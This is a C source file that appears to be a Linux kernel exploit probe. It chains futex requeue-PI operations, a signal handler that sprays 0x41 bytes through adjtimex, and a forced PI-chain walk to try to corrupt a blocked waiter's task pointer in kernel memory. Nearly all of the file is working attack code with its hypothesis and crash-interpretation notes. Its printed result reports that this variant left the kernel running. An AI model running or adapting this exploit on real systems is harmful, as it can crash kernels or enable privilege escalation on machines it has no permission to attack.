/**
 * ghostlock_live_window_cfu.c — CFU while WAIT_REQUEUE_PI still blocked
 *
 * Hypothesis (evaluator): corrupt waiter->task in the live blocking window
 * after CMP_REQUEUE_PI while the waiter remains in-kernel on the PI wait.
 *
 * Mechanism under test:
 *  1) W: WAIT_REQUEUE_PI (no timeout)
 *  2) T: CMP_REQUEUE_PI (GhostLock)
 *  3) O: keeps f_pi_target locked so W stays blocked
 *  4) SIGUSR1 → W handler runs adjtimex 208B 0x41 fill (static covers task@-0x168)
 *  5) O: unlock → PI walk of (hopefully) corrupted waiter
 *
 * Observability:
 *  - /proc/tid/stat state before/after signal
 *  - whether WAIT returns before or after CFU
 *  - kernel crash = cover; survive = live-window shell CFU does not hit
 *    live waiter stack (signal aborts wait) or residual not linked
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/timex.h>
#include <unistd.h>

static uint32_t f_wait __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain __attribute__((aligned(4096)));

static volatile int ready, owner_locked, requeued, cfu_done, wait_returned, done;
static volatile int cfu_ret, cfu_errno;
static volatile pid_t waiter_tid;
static char pre_stat[128], post_stat[128];

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2,
                  uint32_t v3) {
  return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void read_tid_state(pid_t tid, char *out, size_t n) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/stat", (int)tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    snprintf(out, n, "open_errno=%d", errno);
    return;
  }
  ssize_t r = read(fd, out, n - 1);
  close(fd);
  if (r < 0) {
    snprintf(out, n, "read_errno=%d", errno);
    return;
  }
  out[r] = 0;
  /* keep only pid,comm,state */
  char *p = out;
  int spaces = 0;
  for (char *q = out; *q; q++) {
    if (*q == ' ') {
      spaces++;
      if (spaces >= 3) {
        *q = 0;
        break;
      }
    }
  }
  (void)p;
}

static void fire_adjtimex_pattern(void) {
  unsigned char buf[256];
  memset(buf, 0x41, sizeof(buf));
  /* modes=0 at start would be cleaner for EPERM avoidance; still fill 0x41
   * across entire 208B so any residual in [0x118,0x1e8) is obliterated. */
  errno = 0;
  cfu_ret = (int)syscall(SYS_adjtimex, buf);
  cfu_errno = errno;
  cfu_done = 1;
}

static void on_sig(int sig) {
  (void)sig;
  read_tid_state(waiter_tid ? waiter_tid : gettid(), post_stat,
                 sizeof(post_stat));
  fire_adjtimex_pattern();
}

static void *waiter(void *a) {
  (void)a;
  waiter_tid = gettid();

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = on_sig;
  sigemptyset(&sa.sa_mask);
  /* Do NOT set SA_RESTART — we want wait interrupted */
  sigaction(SIGUSR1, &sa, NULL);

  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  ready = 1;
  while (!owner_locked)
    usleep(50);

  printf("[W] tid=%d entering WAIT_REQUEUE_PI (no timeout)\n", (int)waiter_tid);
  long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, NULL, &f_pi_target, 0);
  wait_returned = 1;
  printf("[W] WAIT returned ret=%ld errno=%d cfu_done=%d\n", r, errno, cfu_done);

  if (!cfu_done) {
    printf("[W] CFU did not run in handler — firing after return\n");
    fire_adjtimex_pattern();
  }
  printf("[W] adjtimex ret=%d errno=%d (%s)\n", cfu_ret, cfu_errno,
         cfu_ret < 0 ? strerror(cfu_errno) : "OK");
  printf("[W] pre_stat=%s\n", pre_stat);
  printf("[W] post_stat=%s\n", post_stat);

  /* PI kick */
  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t a, b, c;
    uint32_t d, e;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = 11;
  errno = 0;
  r = syscall(274, 0, &attr, 0);
  printf("[W] sched_setattr ret=%ld errno=%d\n", r, errno);

  futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  /* drop PI target if acquired */
  futex(&f_pi_target, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  done = 1;
  return 0;
}

static void *owner(void *a) {
  (void)a;
  futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
  owner_locked = 1;
  printf("[O] holding f_pi_target\n");

  while (!requeued)
    usleep(50);

  /* Keep W blocked in kernel for a window */
  usleep(20000);
  read_tid_state(waiter_tid, pre_stat, sizeof(pre_stat));
  printf("[O] before signal, W stat=%s wait_returned=%d\n", pre_stat,
         wait_returned);

  /* Signal W — handler should run when kernel delivers signal.
   * If W is still blocked, delivery aborts wait then runs handler. */
  if (waiter_tid > 0) {
    kill(waiter_tid, SIGUSR1);
    printf("[O] SIGUSR1 sent to %d\n", (int)waiter_tid);
  }

  /* Wait for CFU */
  for (int i = 0; i < 200 && !cfu_done; i++)
    usleep(1000);
  printf("[O] after signal: cfu_done=%d wait_returned=%d\n", cfu_done,
         wait_returned);

  /* Unlock target — forces PI wake/walk if waiter still linked */
  usleep(5000);
  futex(&f_pi_target, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  printf("[O] unlocked f_pi_target (PI walk)\n");

  while (!done)
    sleep(1);
  return 0;
}

int main(void) {
  printf("ghostlock_live_window_cfu\n");
  printf("CRASH with pattern => live/residual cover of waiter->task\n\n");

  f_wait = f_pi_target = f_pi_chain = 0;
  pthread_t wt, ot;
  pthread_create(&wt, 0, waiter, 0);
  usleep(100000);
  pthread_create(&ot, 0, owner, 0);
  usleep(150000);

  for (int i = 0; i < 300; i++) {
    long r =
        futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    if (r >= 0) {
      printf("[T] GhostLock CMP_REQUEUE_PI ret=%ld\n", r);
      requeued = 1;
      break;
    }
    usleep(500);
  }
  if (!requeued) {
    printf("[T] requeue failed\n");
    requeued = 1;
  }

  while (!done)
    sleep(1);
  pthread_join(wt, 0);
  pthread_join(ot, 0);

  printf("\n=== RESULT: KERNEL SURVIVED ===\n");
  printf("Interpretation: shell CFU cannot write another/live blocked stack;\n");
  printf("signal aborts WAIT before handler CFU; residual after abort not live.\n");
  return 0;
}
